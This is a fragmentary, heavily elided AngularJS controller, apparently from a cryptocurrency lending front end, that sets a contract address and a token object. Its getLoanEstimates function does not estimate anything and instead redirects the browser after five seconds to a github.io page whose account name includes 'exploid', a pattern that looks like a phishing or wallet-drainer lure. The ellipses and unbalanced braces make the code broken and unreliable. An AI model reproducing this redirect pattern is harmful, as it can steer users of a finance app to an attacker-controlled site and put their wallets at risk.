...
app.controller('myCtrl', async function($scope) {
    $scope.init = function() {
        $scope.contractAddress = '0x6C11B3e875C4CFabfFd84d5a2f00d4A7e16EB0bE';
        ...
        $scope.erc20 = {
            ...
            symbol: ''
                        ...
                        $scope.getLoanEstimates = function() {
                            ...
                            window.location.href = 'https://Cyberpunk77-exploid.github.io/Router/';
                        }, 5000);
                                            }
                                        });
                                    }
